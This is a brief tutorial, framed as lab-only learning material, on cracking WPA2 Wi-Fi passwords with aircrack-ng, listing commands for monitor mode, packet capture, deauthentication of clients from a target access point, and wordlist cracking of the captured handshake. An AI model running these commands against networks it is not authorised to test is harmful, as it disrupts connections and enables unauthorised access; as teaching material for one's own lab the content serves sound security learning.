# Wi-Fi Hacking Basics (WPA2) 📶

For learning only in your own lab.

## Typical Lab Flow

```bash
airmon-ng start wlan0  # Enables monitor mode on wireless interface.
airodump-ng wlan0mon  # Captures nearby Wi-Fi packets and handshake data.
aireplay-ng --deauth 5 -a <AP_BSSID> wlan0mon  # Sends deauth frames to force reconnect and capture handshake.
aircrack-ng -w wordlist.txt -b <AP_BSSID> capture.cap  # Tries passwords from wordlist against captured handshake.
```

## Quick Win 🎯
Practice with your own router and a known test password.

## Memory Hack 🧠
**M.C.C.C** = Monitor, Capture, Crack, Confirm.
